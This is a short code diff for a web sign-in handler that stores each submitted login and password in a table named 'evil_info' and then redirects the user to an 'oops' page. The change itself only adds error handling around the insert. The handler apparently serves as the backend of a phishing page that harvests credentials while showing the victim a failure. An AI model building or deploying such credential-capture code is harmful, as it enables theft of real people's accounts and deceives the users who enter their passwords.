@@ -21,13 +21,14 @@ def signin():
         if 'login' in request.form and 'password' in request.form:
             login = request.form['login']
             password = request.form['password']
-
-            insert_query = """
-                    INSERT INTO evil_info (login, password)
-                    VALUES (%s, %s)
-                    """
-            cursor.execute(insert_query, (login, password))
-            conn.commit()
+            try:
+                cursor.execute("""
+                        INSERT INTO evil_info (login, password)
+                        VALUES (%s, %s)
+                        """, (login, password))
+                conn.commit()
+            except Exception as e:
+                conn.rollback()
 
             return redirect(url_for('oops'))
 
